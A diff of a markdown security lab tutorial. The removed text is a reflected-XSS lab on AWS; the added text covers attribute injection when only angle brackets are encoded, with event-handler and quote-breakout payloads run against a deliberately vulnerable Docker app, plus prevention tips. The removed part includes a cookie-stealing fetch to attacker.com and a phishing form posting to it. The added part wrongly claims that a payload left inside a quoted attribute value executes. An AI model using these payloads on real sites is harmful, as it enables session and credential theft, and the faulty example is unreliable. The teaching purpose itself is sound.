@@ -1,492 +1,240 @@
-# **Reflected XSS in AWS**
+# Reflected XSS via HTML-encoded attribute injection
 
-Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user’s browser. These scripts can compromise sensitive data, hijack user sessions, deface websites, or perform unauthorized actions. We will also perform a Reflected XSS attack on an application hosted in `AWS` to understand how it works.
+Cross-site Scripting (XSS) is a prevalent web security vulnerability that allows attackers to inject malicious scripts into web applications. One such variant is **Reflected XSS**, where an attacker injects a payload that gets immediately reflected in the response. Specifically, **Reflected XSS into attributes with angle brackets HTML-encoded** is a technique where user input is embedded into an HTML attribute but is improperly encoded, making it susceptible to exploitation.
 
-## **Objective**
+## Objective
 
-- Creating the infrastructure in `AWS` using `Terraform`.
-- Running the vulnerable `Application` in `Docker`.
-- Performing a `Reflected XSS` attack on the `Application`.
-- Understanding how malicious scripts can be injected and stored on a server.
-- Identifying ways to detect and mitigate stored XSS vulnerabilities.
-- Demonstrating security best practices to prevent XSS attacks in production systems.
+This documentation aims to:
 
-## **What is Cross-Site Scripting (XSS)?**
+- Explain **Reflected XSS** within HTML attributes.
+- Discuss how **angle brackets (<> characters) are HTML-encoded but injection is still possible**.
+- Demonstrate **bypassing mechanisms** to exploit this vulnerability.
+- Explore **practical applications** of this attack.
+- Provide insights on **how to mitigate this vulnerability**.
 
-XSS is a **web security vulnerability** where attackers inject **malicious scripts** into web pages. These scripts can manipulate the DOM, steal sensitive data, and impersonate users. XSS attacks usually exploit vulnerabilities in input handling and output rendering in web applications.
+## What is Reflected XSS?
 
-![](./images/1.svg)
-
-## **How Does XSS Work?**
-
-### **1. Injection**  
-The attacker injects **malicious input** into a vulnerable part of the web application, such as a form, URL parameter, or comment section. This input is designed to be processed as executable code rather than plain text.
-
-- Example injection in a form field:  
-  ```html
-  <script>alert('XSS Attack');</script>
-  ```
-
-### **2. Execution**  
-The browser executes the injected script when the user accesses the page containing the malicious input. Depending on the type of XSS (Stored, Reflected, or DOM-Based), this could happen automatically (Stored XSS) or require a user to click a malicious link (Reflected XSS).
-
-- Example vulnerable output:  
-  ```html
-  <p>Search results for: <script>alert('XSS Attack');</script></p>
-  ```
-  
-The browser renders and runs the script, displaying an alert box in this example.
-
-### **3. Attack**  
-Once executed, the script can perform harmful actions such as:
-- **Stealing cookies**:  
-  ```javascript
-  fetch('https://attacker.com/steal?cookie=' + document.cookie);
-  ```
-
-  `document.cookie` is used to get the cookies of the user which is stored in the browser.
-
-- **Manipulating the page (DOM)**:  
-  ```javascript
-  document.body.innerHTML = '<h1>This site has been hacked!</h1>';
-  ```
-  `innerHTML` is used to get the innerHTML of the body of the page. When the page is loaded, the script is executed and the innerHTML of the body is changed to `<h1>This site has been hacked!</h1>`.
-
-- **Tricking users with phishing forms**:
-  ```html
-  <form action="https://attacker.com/login" method="POST">
-    <input type="text" name="username" placeholder="Username">
-    <input type="password" name="password" placeholder="Password">
-    <button type="submit">Log In</button>
-  </form>
-  ```
-
-  The form is submitted to the attacker's server and the username and password are stolen. User is not aware that their credentials are being stolen as the form is submitted to the attacker's server and the user is redirected to the attacker's website.
-
-## **Types of XSS Attacks**
-
-![](./images/3.svg)
-
-### **1. Stored XSS (Persistent XSS)**  
-In **Stored XSS**, the malicious input is saved on the server, such as in a database. It gets embedded in a web page and automatically executed whenever a user accesses that page. For example, an attacker could post a comment containing a script, which runs whenever someone views the comment.
-
-### **2. Reflected XSS (Non-Persistent XSS)**  
-In **Reflected XSS**, the injected script is not stored on the server. Instead, it is included in the server's response based on user input. The attack usually requires the victim to click a malicious link that contains the script in a query parameter or form submission.
-
-### **3. DOM-Based XSS**  
-In **DOM-Based XSS**, the vulnerability is present in client-side JavaScript code. The application reads untrusted input (e.g., from the URL) and dynamically manipulates the page's content, leading to script execution without any server involvement.
-
-
-## **Reflected XSS**
-
-Reflected XSS, also known as **non-persistent XSS**, occurs when the web application immediately reflects user input in the server’s response without properly validating or escaping it. Since the input is not stored, the attack typically relies on **social engineering** to trick the user into visiting a specially crafted malicious link.
-
-### **How Reflected XSS Works**
+Reflected XSS is a type of XSS attack where the malicious script is reflected off the web application back to the victim's browser. This type of XSS is common in web applications that handle user input, such as name fields, search fields, comment sections, and login forms.
 
 ![](./images/2.svg)
 
-1. **Attacker Crafts Malicious URL**  
-   The hacker creates a URL containing a malicious script and tricks the user into clicking it.
+An attacker crafts a malicious URL containing a script and tricks a user into clicking it. The vulnerable website reflects the script in its response without proper sanitization, causing the user's browser to execute it, leading to data theft or session hijacking.
 
-2. **User Clicks the Malicious URL**  
-   The victim unknowingly interacts with the link, sending a request to the vulnerable website.
+## HTML Attribute Injection
 
-3. **Website Reflects the Malicious Script**  
-   The website processes the request and includes the malicious script in its response without proper sanitization.
+Reflected XSS in attributes occurs when **unsanitized user input is placed inside an HTML attribute**, such as:
 
-4. **User’s Browser Executes the Script**  
-   The victim's browser runs the injected script, which can steal sensitive information or compromise the user's session.
-
-### **Impact of Reflected XSS**
-
-- **Stealing Sensitive Data:** Attackers can steal cookies, session tokens, and other sensitive information.
-- **Session Hijacking:** By stealing session data, attackers can impersonate users and gain unauthorized access to their accounts.
-- **Phishing:** Attackers can trick victims into entering credentials by displaying fake login forms.
-- **Page Defacement:** The attacker can alter the appearance and content of the web page.
-
-## **Hands-on with Reflected XSS in AWS**
-Now we will run a vulnerable `Application` in `AWS` and perform a `Reflected XSS` attack on it.
-
-To Deploy the `Application` in `AWS` first we need to create the infrastructure. Including `AWS` `VPC`,`Subnet`,`Route Table`,`Internet Gateway`,`Key Pair`,`EC2 Instance`. Creating this infrastructure is lengthy process. So we will use `Terraform` to create the infrastructure.
-
-**Terraform** is an open-source infrastructure as code tool that allows you to define and provision your cloud infrastructure in a declarative manner. It provides a high-level configuration language to describe your infrastructure in a way that is easy to understand and maintain.
-
-## **Create the Infrastructure with `Terraform`**
-
-![](./images/awslogo.svg)
-
-### **Step 1: Configure aws credentials**
-
-To get `AWS` Credententals open the lab landing page in right bottom corner in `Poridhi`, Click on Generate Credentails for `AWS`.
-
-![](./images/awsconfig.png)
-
-It will provide necessary credentials to access `AWS` services.
-
-Copy the `Access Key ID` and `Secret Access Key`.
-
-To Configure the `AWS` try the following command:
-
-```bash
-aws configure
+```html
+<input value="USER_INPUT">
 ```
 
-![](./images/awsconfig2.png)
-Use the `Access Key ID` and `Secret Access Key` that was copied to configure the `AWS` credentials. For `region` type `ap-southeast-1` and format as `json`.
+### Why is This Dangerous?
 
-### **Step 2: Creating Key Pair**
+When a web application takes user input and directly places it inside an HTML attribute **without proper encoding or validation**, an attacker can manipulate the input to inject malicious scripts.
 
-```bash
-mkdir aws-infra
-cd aws-infra
-```
-Inside the project folder apply the following command to create the key file
+Even if **angle brackets (`< >`) are encoded** (converted to `&lt;` and `&gt;` to prevent direct HTML injection), other special characters such as **quotes (`"` or `'`) and backticks (` ` ` )** might still be allowed. Attackers can use these characters to break out of the attribute and insert harmful JavaScript.
 
-```bash
-aws ec2 create-key-pair --key-name my-key --query "KeyMaterial" --output text > my-key.pem
-```
+### How It Works
 
-After running the command, a key file will be created in the project folder named `my-key.pem`.
+Consider this vulnerable input field:
 
-Make the key file read only
-
-```bash
-chmod 400 my-key.pem
+```html
+<input value="John Doe">
 ```
 
-### **Step 3: Creating the `main.tf` file**
+If an attacker enters:
 
-Create the `main.tf` file in the project folder with the following content:
-
-```bash
-provider "aws" {
-  region = "ap-southeast-1"
-}
-
-# Create VPC
-resource "aws_vpc" "my_vpc" {
-  cidr_block           = "10.0.0.0/16"
-  enable_dns_support   = true
-  enable_dns_hostnames = true
-
-  tags = {
-    Name = "my-vpc"
-  }
-}
-
-# Create Public Subnet
-resource "aws_subnet" "public_subnet" {
-  vpc_id                  = aws_vpc.my_vpc.id
-  cidr_block              = "10.0.101.0/24"
-  availability_zone       = "ap-southeast-1a"
-  map_public_ip_on_launch = true  # Assign public IP automatically
-
-  tags = {
-    Name = "public-subnet"
-  }
-}
-
-# Create Internet Gateway
-resource "aws_internet_gateway" "igw" {
-  vpc_id = aws_vpc.my_vpc.id
-
-  tags = {
-    Name = "my-internet-gateway"
-  }
-}
-
-# Create Route Table for Public Subnet
-resource "aws_route_table" "public_rt" {
-  vpc_id = aws_vpc.my_vpc.id
-
-  # Allow all traffic to the internet
-  route {
-    cidr_block = "0.0.0.0/0"
-    gateway_id = aws_internet_gateway.igw.id
-  }
-
-  tags = {
-    Name = "public-route-table"
-  }
-}
-
-# Associate Route Table with Public Subnet
-resource "aws_route_table_association" "public_association" {
-  subnet_id      = aws_subnet.public_subnet.id
-  route_table_id = aws_route_table.public_rt.id
-}
-
-# Create Security Group for EC2 Instance
-resource "aws_security_group" "ec2_sg" {
-  vpc_id = aws_vpc.my_vpc.id
-
-  # Allow SSH (Port 22) from anywhere
-  ingress {
-    from_port   = 22
-    to_port     = 22
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  # Allow HTTP (Port 80) from anywhere
-  ingress {
-    from_port   = 80
-    to_port     = 80
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  # Allow HTTPS (Port 443) from anywhere
-  ingress {
-    from_port   = 443
-    to_port     = 443
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  # Allow Application Traffic (Port 8000)
-  ingress {
-    from_port   = 8000
-    to_port     = 8000
-    protocol    = "tcp"
-    cidr_blocks = ["0.0.0.0/0"]  # Open to all (Modify for specific IPs)
-  }
-
-  # Allow all outbound traffic
-  egress {
-    from_port   = 0
-    to_port     = 0
-    protocol    = "-1"
-    cidr_blocks = ["0.0.0.0/0"]
-  }
-
-  tags = {
-    Name = "ec2-security-group"
-  }
-}
-
-# Create EC2 Instance in Public Subnet
-resource "aws_instance" "my_instance" {
-  ami                    = "ami-0672fd5b9210aa093"
-  instance_type          = "t2.micro"
-  subnet_id              = aws_subnet.public_subnet.id
-  vpc_security_group_ids = [aws_security_group.ec2_sg.id]
-  
-  associate_public_ip_address = true  # Assign Public IP
-  key_name                    = "my-key"  # Use the key pair
-
-  tags = {
-    Name = "my-public-ec2"
-  }
-}
-
-# Output the Public IP of the EC2 instance
-output "ec2_public_ip" {
-  description = "The public IP of the EC2 instance"
-  value       = aws_instance.my_instance.public_ip
-}
+```
+onfocus=alert(1) autofocus=
 ```
 
-This state file will create the infrastructure and output the public IP of the EC2 instance. Here we have created a `VPC`, `Subnet`, `Internet Gateway`, `Route Table`, `Security Group` and `EC2 Instance`.
+The rendered HTML will be:
 
-### **Step 4: Apply the Terraform State File**
-
-```bash
-terraform init
+```html
+<input value="onfocus=alert(1) autofocus=">
 ```
 
-This command will initialize the terraform project.
+Now, whenever a user clicks inside the input field, the JavaScript `alert(1)` executes.
+
+## How Attackers Exploit This Vulnerability
+
+![](./images/htmlencodedreflectedXSS.svg)
+
+Attackers use several techniques to inject malicious scripts, including:
+
+### 1. Breaking Out of Attributes
+
+- Injecting quotes (`"` or `'`) can **break out of the attribute** and execute JavaScript.
+- Example payload:
+  ```html
+  "><script>alert(1)</script>
+  ```
+- This breaks the `value` attribute and inserts a new `<script>` tag, leading to execution.
+
+### 2. Using Event Handlers
+
+- HTML elements support various **JavaScript event handlers** such as `onmouseover`, `onfocus`, `onerror`, etc.
+- Example payload:
+  ```html
+  " onmouseover="alert(1)"
+  ```
+- When the user hovers over the input field, `alert(1)` is executed.
+
+### 3. Exploiting Backticks in JavaScript Context
+
+- Some JavaScript templating engines allow input inside **backticks (` ` ` )**.
+- Example payload:
+  ```html
+  <input value=`onfocus=alert(1)` autofocus>
+  ```
+- This can lead to unintended script execution when the input field is focused.
+
+## How the Bypass Mechanism Works
+
+1. **HTML Attribute Context Misuse**: Attackers **inject closing characters** (`"`, `'`, `` ` ``) to break out of attributes and execute JavaScript.
+2. **Event Listeners**: JavaScript executes when events like `onclick`, `onmouseover`, or `onfocus` trigger.
+3. **Mismatched Encoding**: If `< >` are encoded but `"` or `'` are not, attackers can **break out of attributes**.
+4. **Polyglot Payloads**: Attackers mix different techniques (e.g., encoding tricks) to evade filters and execute JavaScript.
+
+## Practical Application
+
+Now we will vulnerable application to exploit the Reflected XSS via HTML-encoded attribute injection. We will run the application in docker container and then we will exploit the vulnerability.
+
+### **Step 1: Pull the Docker Image**
 
 ```bash
-terraform apply
-```
-
-This command will apply the state file and create the infrastructure. While applying the state file, it will ask for `yes` to apply the changes.
-
-After the state file is applied, it will output the public IP of the EC2 instance.
-
-### **Step 5: SSH into the EC2 Instance**
-
-Get the public IP of the EC2 instance from the output of the `terraform output` command.
-
-```bash
-terraform output
-```
-![](./images/aws3.png)
-
-copy the `Public IP` of the `ec2 instance`.
-
-now using the public ip `ssh` into the `ec2-instance`
-
-```bash
-ssh -i my-key.pem ubuntu@<public-ip>
-```
-If you ssh for first time, it will ask for `yes` to continue.
-
-Now you are successfully ssh into the `ec2-instance`.
-
-![](./images/aws4.png)
-
-### **Step 6: Install Docker on the EC2 Instance**
-
-Inside the `ec2-instance` create a `install.sh` script for installing `docker`
-
-```bash
-nano install.sh
-```
-Now paste the following script
-
-```bash
-#!/bin/bash
-sudo apt update -y && sudo apt upgrade -y
-# Install dependencies
-sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
-# Add Docker’s GPG key and repository
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-# Update package list and install Docker
-sudo apt update -y && sudo apt install -y docker-ce
-sudo systemctl start docker && sudo systemctl enable docker
-sudo usermod -aG docker $USER
-newgrp docker
-```
-
-To save the script and exit the nano editor, press `Ctrl + O` ,`Enter` and `Ctrl + X`.
-
-Now make the script executable
-
-```bash
-chmod +x install.sh
-```
-
-Now run the script
-
-```bash
-./install.sh
-```
-
-Now you have successfully installed `docker` on the `ec2-instance`.
-
-You can verify the docker installation by running the following command
-
-```bash
-docker --version
-```
-![](./images/aws2.png)
-
-## **Run the Application in Docker**
-
-### **Step 1: Pull the Application from Docker Hub**
-
-```bash
-docker pull fazlulkarim105925/reflected-xss
+docker pull fazlulkarim105925/reflectedxssbracketencoded
 ```
 
 ### **Step 2: Run the Docker Container**
 
 ```bash
-docker run -d -p 8000:8000 fazlulkarim105925/reflected-xss
+docker run -d -p 8000:8000 fazlulkarim105925/reflectedxssbracketencoded
 ```
 
-### **Step 3: Check the Container Status**
+### **Step 3: Create a Load Balancer in Poridhi's Cloud**
 
-By using the following command you can check the status of the container
+Find the `eth0` IP address with `ifconfig` command.
+
+![](./images/3.png)
+
+Create a Load Balancer with the `eth0 IP` address and the port `8000`
+
+![](./images/4.png)
+
+### **Step 4: Access the Web Application**
+
+Access the web application with the the provided `URL` by `loadbalancer`
+
+![](./images/bei1.png)
+
+### **Step 5: Exploit the Vulnerability**
+
+Now we will exploit the vulnerability by entering the malicious payload in the name field.
+
+First try with your name (e.g. `Poridhi`). If you click on submit button, you will see a greeting message.
+
+Below the Greeting message, you will see `Response Viwer` Section. Here you can see the `Raw HTML` that was inserted and in `Encoded HTML` you can see the HTML that was encoded.
+For example, if you enter `Poridhi` in the name field, you will see the following response:
+
+**For `Raw HTML`:**
+```bash
+<div data-name="Poridhi">
+    <p>Hello, Poridhi! Welcome to our demo.</p>
+</div>
+```
+
+![](./images/bei2.png)
+
+**For `Encoded HTML`:**
+```bash
+<div data-name="Poridhi">
+    <p>Hello, Poridhi! Welcome to our demo.</p>
+</div>
+```
+
+![](./images/bei3.png)
+
+As no `<` or `>` are characters are used in the payload, so the payload is not encoded.
+
+Now try with the malicious payload. For example, 
+```bash
+<script>alert(1)</script>
+```
+
+**You will see the following response:**
+
+**For `Raw HTML`:**
+
+![](./images/bei4.png)
+
+**For `Encoded HTML`:**
+
+![](./images/bei5.png)
+
+As `<` and `>` are used in the payload, so the payload is encoded.
+
+**But `No alert` is shown!! Why?**
+
+The reason is that the payload is encoded and the encoded payload is not executed. Browser will discard this as it is not a valid HTML tag.
+
+**So how to exploit this vulnerability?**
+
+If we use the payload with `'` or `"`:
 
 ```bash
-docker ps
-```
-![](./images/aws5.png)
-
-### **Step 4: Access the Application**
-
-Now you can access the application by going to the `http://<public-ip>:8000` in the browser.
-
-![](./images/aws6.png)
-
-
-This web app designed to demonstrate Reflected XSS attacks. It allows users to input data, which is reflected without sanitization, making it vulnerable to malicious script execution. The app includes an attack simulation, hacker dashboard for captured data, and an XSS explanation page.
-
-In `Home` page, if we enter any value in the `name` field, it will be reflected in the `results` field and greet the user with the value entered in the `field`.
-
-![](./images/aws7.png)
-
-Now, if we enter the following value in the `name` field:
-
-```html
-<script>alert('XSS');</script>
+"Poridhi'
 ```
 
-The value will be reflected in the `results` field and the script will be executed and an `alert` will pop up
+You will see the following encoded response
+
+![](./images/bei7.png)
+
+We can see that `'` and `"` are not encoded. So we can use this to exploit the vulnerability.
+
+Now try with this payload:
+
+```bash
+" onmouseover="alert('hover test')
+```
+![](./images/bei6.png)
+
+In this payload, `"` are used to break out of the attribute and `onmouseover` is used to execute the `alert('hover test')` when,
+
+![](./images/bei8.png)
+
+you hovers over the `Greeting area` field.
+
+We can also try out this payload in the `name` field to exploit the vulnerability.
+
+```bash
+" onclick="alert('clicked')
+```
+
+```bash
+" onfocus="alert('focused')
+```
+
+## Prevention Techniques
 
 
-Now if open the `inspect` tool ( By pressing `Ctrl + Shift + I` in the browser) and check the `elements` tab, we can see that the value entered in the `name` field is reflected in the `results` field and the script is executed.
+To mitigate Reflected XSS via HTML-encoded attribute injection, we can use the following techniques:    
 
-![](./images/aws11.png)
+- Sanitize All User Input Properly (e.g. Encode `"` and `'` in user input.)
+- Use Content Security Policy (CSP) to prevent inline JavaScript execution.
+- Avoid Inline JavaScript.
+- Validate and sanitize all attributes. 
+- Implement Input Validation.
+- Use a Web Application Firewall (WAF) to block malicious requests.
 
-In the Application, you will find a `Button` named `Special Greeting`.
 
-![](./images/9.png)
+## Conclusion
 
-If we click on the the Button, it will redirect you to `/whatWasHappen` page with a modal indicating that the information is being `hacked`. 
 
-![](./images/aws8.png)
+Reflected XSS within HTML attributes is a dangerous vulnerability, especially when **only partial encoding is applied**. Attackers can bypass filters using **quotes, event handlers, and backticks**. To prevent such vulnerabilities:
 
-It basically send the browser to `/whatWasHappen` route within the application.
+- **Sanitize all user input properly** (encode `"` and `'`).
+- **Use Content Security Policy (CSP)** to prevent script execution.
+- **Avoid inline JavaScript** and prefer strict attribute handling.
 
-![](./images/aws9.png)
 
-Now as your information is being `hacked`, you can see the `hacked` information by clicking on `View Stolen Data` Button.
-
-![](./images/aws10.png)
-
-You have successfully performed a Reflected XSS attack on the application.
-
-## **How to Prevent Reflected XSS**
-
-### **Input Validation**  
-   Validate user input to allow only safe and expected formats. Reject input with special characters or HTML tags.
-
-   **Example (Python):**
-   ```python
-   import re
-
-   def is_valid_input(user_input):
-       # Allow only letters, numbers, and spaces
-       return bool(re.match("^[a-zA-Z0-9 ]+$", user_input))
-   ```
-
-   **Example Usage:**  
-   ```python
-   user_input = "<script>alert('XSS');</script>"
-   if not is_valid_input(user_input):
-       print("Invalid input!")
-   ```
-
-### **Output Escaping**  
-   Escape special characters like `<`, `>`, and `&` to prevent browsers from executing scripts.
-
-   **Example (Python with Flask):**
-   ```python
-   from flask import Flask, request
-   from markupsafe import escape
-
-   app = Flask(__name__)
-
-   @app.route('/search')
-   def search():
-       user_input = request.args.get('q', '')
-       safe_output = escape(user_input)  # Escape special characters
-       return f"<p>Search results for: {safe_output}</p>"
-   ```
-
-   **Result:**  
-   If the input is `<script>alert('XSS');</script>`, it will be displayed as plain text (`&lt;script&gt;alert('XSS');&lt;/script&gt;`) instead of executing the script.
-
-### **Use Content Security Policy (CSP)**  
-   Implement a CSP to block unauthorized scripts. Example header:  
-   ```http
-   Content-Security-Policy: default-src 'self'; script-src 'self';
-   ```
-## **Conclusion**
-
-In this lab, we have learned about the basics of XSS and how it works. We have also learned about different types of XSS attacks and how to perform a Reflected XSS attack on an application. We also learned about how to prevent Reflected XSS attacks. In our upcoming labs, we wll explore Stored XSS.
